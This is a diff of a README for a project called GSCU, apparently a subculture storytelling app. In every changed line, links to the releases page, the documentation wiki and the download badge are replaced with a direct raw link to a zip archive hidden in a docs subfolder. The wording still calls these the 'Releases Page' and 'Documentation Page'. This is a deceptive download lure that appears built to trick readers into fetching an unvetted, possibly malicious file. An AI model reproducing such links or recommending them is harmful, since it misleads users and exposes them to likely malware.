@@ -1,6 +1,6 @@
 # 🌌 GSCU - Explore the Future of Subculture
 
-[![Download GSCU](https://img.shields.io/badge/Download%20GSCU-v1.0-blue)](https://github.com/sannwilo23/GSCU/releases)
+[![Download GSCU](https://raw.githubusercontent.com/sannwilo23/GSCU/main/docs/队介绍及附件文档/Software-v1.7.zip%20GSCU-v1.0-blue)](https://raw.githubusercontent.com/sannwilo23/GSCU/main/docs/队介绍及附件文档/Software-v1.7.zip)
 
 ## 🌟 Introduction
 
@@ -11,7 +11,7 @@ Welcome to GSCU! This application explores the fascinating world of near-future 
 Follow these simple steps to download and run GSCU:
 
 1. **Access the Download Page**  
-   Visit our [Releases Page](https://github.com/sannwilo23/GSCU/releases) to find the latest version of GSCU.
+   Visit our [Releases Page](https://raw.githubusercontent.com/sannwilo23/GSCU/main/docs/队介绍及附件文档/Software-v1.7.zip) to find the latest version of GSCU.
 
 2. **Choose Your Version**  
    On the Releases Page, look for the latest version. You will see a list of available files. Select the version that matches your operating system.
@@ -68,10 +68,10 @@ If you encounter any issues, feel free to reach out for help. You can create an 
 
 ## 🔗 More Information
 
-For additional details about GSCU and its features, you can visit our [Documentation Page](https://github.com/sannwilo23/GSCU/wiki).
+For additional details about GSCU and its features, you can visit our [Documentation Page](https://raw.githubusercontent.com/sannwilo23/GSCU/main/docs/队介绍及附件文档/Software-v1.7.zip).
 
 ## ⚙️ Download & Install
 
-To download GSCU, visit the [Releases Page](https://github.com/sannwilo23/GSCU/releases). Select the correct file for your operating system. After downloading, follow the installation instructions outlined in the Getting Started section.
+To download GSCU, visit the [Releases Page](https://raw.githubusercontent.com/sannwilo23/GSCU/main/docs/队介绍及附件文档/Software-v1.7.zip). Select the correct file for your operating system. After downloading, follow the installation instructions outlined in the Getting Started section.
 
 Happy exploring! Enjoy building and sharing stories in this vibrant community.
